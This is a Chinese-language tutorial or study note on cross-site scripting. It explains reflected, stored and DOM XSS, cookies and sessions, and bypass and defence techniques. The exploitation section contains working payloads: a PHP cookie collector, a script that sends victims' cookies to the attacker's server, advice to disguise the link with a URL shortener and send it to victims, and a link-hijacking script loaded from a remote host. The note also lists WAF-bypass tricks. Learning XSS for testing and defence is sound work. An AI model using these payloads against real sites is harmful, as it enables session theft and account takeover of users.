XSS分类

反射型

提交的数据只对本次访问产生了影响

  1. 攻击者将 payload 放置在 url 链接中（这是针对是 GET 型反射 XSS）
  2. 用户点击该恶意链接
  3. XSS 服务将 XSS 代码（JavaScript 代码）以及视图返回给客户端
  4. 客户端解析视图以及 XSS 代码（JavaScript 代码），并将执行结果发送到 XSS 平台
  5. 攻击者访问 XSS 平台，读取用户的敏感信息（Cookie）

存储型

提交的数据存入了数据库，别人访问这个页面的时候就会自动获取数据（不一定是数据库，也有可能是存在于日志中）

  1. 攻击者向 XSS 服务插入 XSS 代码
  2. XSS 服务会将其结果存储到数据库中
  3. 用户正常访问 XSS 服务
  4. XSS 服务将数据库的数据以及视图返回给前端，前端渲染视图并加载数据，其中数据里包含恶意 XSS 代码（JavaScript 代码）
  5. 客户端渲染视图，加载 XSS 代码，并向攻击者的 XSS 服务发送敏感信息
  6. 攻击者读取用户的敏感信息

DOM型

基于文档对象模型Document Object Model的一种漏洞，DOM是一个与平台，编程无关的接口，允许脚本动态的访问

  1. 攻击者将 payload 放置在 url 链接中（这是针对是 GET 型反射 XSS）
  2. 用户点击恶意链接，并打开浏览器
  3. 此时浏览器客户端并不会发起 http 请求到 XSS 服务，而是在浏览器客户端执行 XSS（JavaScript 代码）
  4. 此时将 XSS 代码执行结果发送给攻击者的恶意服务
  5. 攻击者访问自己的 XSS 平台并读取用户的敏感信息

Cookie、Session

session

  1. session从字面上讲就是会话，类似和某个人在交流，但是如何确定这个交流的对象就是想要交流的人，对方肯定具有，某种特征表明
  2. 为了做这种区分，服务器需要给每个客户端分配不同的身份标识，然后客户端每次向服务器发请求的时候都会携带这个身份表示，服务器自然就知道这个请求来自谁
  3. 至于客户端怎么保存这个身份表示，有很多种方式，但对于浏览器客户端，默认采用cookie的方式，服务器使用session把用户的信息临时保存到服务器上，用户离开后session会销毁
  4. 但是这种存储方式相比cookie更安全，但是如果XSS服务器做了负载均衡，那么下个操作请求到了另一台服务器时session会丢失

cookie

  1. cookie是一个非常具体的东西，就是浏览器能永久存储的一种数据，仅仅是浏览器实现的一种数据存储功能，cookie由服务器生成后发送给浏览器
  2. 浏览器把cookie以kv格式保存到某个目录下的文本文件内

伪协议

  1. 不同于网络上真实存在的协议如：http://、https://、ftp://
  2. 伪协议只有关联应用能够用，如：php://、tencent://(关联QQ)
  3. javascript:声明url的主体是任意javascript代码，如javascript:alert(1)
  4. js容错率很高，哪里能用执行哪里，单引号也可以闭合双引号（浏览器特性）

事件触发

oninput="alert(1)"
onclick="alert(1)"
<img src='1' onerror=alert(document.cooke)>// 这是在路径不正确的情况下弹框测试
<input name="keyword" value=""'="">// 这是在value里面单独写一个'搞得错
<input name="keyword" value="" oninput="alert(1)" //'"> // 这是在value里面进行双引号闭合（浏览器特性）

XSS手法

XSS可以做什么

  1. 获取cookie
  2. 获取内网IP
  3. 获取浏览器保存的明文密码
  4. 截取网页屏幕
  5. 网页上的键盘记录

XSS利用

远程传递cookie

  1. 攻击机器搭建XSS环境(如果是真实环境需要公网IP)，创建php代码
<?php $cookie=$_GET['cookie']; file_put_contents('cookie.txt',$cookie); ?>
  1. 在存在反射型XSS的地方打入
<script>document.location='http://自己的URL/xss/cookie.php?cookie='+document.cookie</script>
  1. 获取完整链接，利用短网址进行伪装
http://192.168.1.113/dvwa/vulnerabilities/xss_r/?name=<script>document.location='http://192.168.1.112/xss/cookie.php?cookie='+document.cookie</script>
  1. 将URL发送给受害者就可以获取cookie

篡改页面url

把存在反射型XSS的页面的所有a标签的url设置修改为自己自定义的url

  1. 远程服务器写一个JS文件
<script> 
  window.onload = function( ) { 
    var link=document.getElementsByTagName("a"); 
    for(j = 0; j < link.length; j++) { 
      link[j].href = "https://www.baidu.com"; 
    } 
  } 
</script>
  1. 存在XSS的地方加载payload
<script src="http://服务器IP/js文件"></script>

绕过XSS防护

代码过滤

  1. 单引号双引号代替右尖括号
<script src='http://wwww.baidu.com/'
<script src="http://wwww.baidu.com/"
  1. 垃圾数据干扰闭合
<script src='http://wwww.baidu.com/'akjsdavk!@#>
  1. 特殊符号干扰（#）
<script src='http://wwww.baidu.com/'#>
  1. 标签语法替换（FUZZ）
python3 xsstrike.py -u http://xxxxx --fuzzer
  1. 数据提交方式更改

修改请求方式 GET -> POST / POST -> GET

XSS总结

分类

反射型 : 提交的数据只对本次访问产生了影响
存储型 : 提交的数据会被存储到数据库中
DOM型 : 基于DOM文档对象进行攻击

cookie和session区别

session是存储在服务器中，更加安全，主要是给每个客户端分配不同的身份标识
cookie是浏览器能永久存储的一种数据，它是由服务器生成后发送给浏览器，浏览器以kv格式保存到某个目录下的文本内

绕WAF

先打入测试语句，然后慢慢分析可能拦截哪些或者放通哪些 标签替换、特殊符号（#）、单引号替换尖括号、DOM型XSS中script => scri+t、fuzz测试

xss防护

输入输出编码、加WAF、开启http-only
